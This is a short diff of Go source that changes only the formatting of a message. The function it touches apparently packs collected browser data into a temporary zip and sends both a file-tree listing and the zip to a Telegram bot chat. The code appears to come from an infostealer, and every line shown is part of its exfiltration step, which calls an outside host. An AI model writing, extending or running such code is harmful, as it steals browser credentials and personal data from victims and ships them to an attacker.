@@ -211,7 +211,7 @@ func Run(botToken, chatId string) {
 	}
 	defer os.Remove(tempZip)
 
-	message := fmt.Sprintf("Browsers: ```%s```", fileutil.Tree(tempDir, ""))
+	message := fmt.Sprintf("Browsers: %s", fileutil.Tree(tempDir, ""))
 
 	requests.Send2TelegramMessage(botToken, chatId, message)
 	requests.Send2TelegramDocument(botToken, chatId, tempZip)
